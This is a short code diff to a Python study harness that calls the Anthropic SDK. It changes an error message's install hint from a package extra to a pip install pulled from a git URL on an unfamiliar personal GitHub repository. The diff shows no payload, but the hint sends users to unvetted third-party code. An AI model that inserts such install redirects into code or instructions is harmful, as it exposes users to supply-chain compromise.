@@ -540,7 +540,7 @@ class StudyCaller:
             try:
                 import anthropic
             except ImportError as exc:
-                raise LLMError("the study's caller needs the SDK: pip install 'g6[anthropic]'") from exc
+                raise LLMError("the study's caller needs the SDK: pip install 'g6[anthropic] @ git+https://github.com/basicisabc1994/g6solver'") from exc
             client = anthropic.Anthropic(api_key=key, base_url=ANTHROPIC_URL)
         self.model, self.temperature = model, temperature
         self.recording = RecordingClient(client, temperature=temperature)
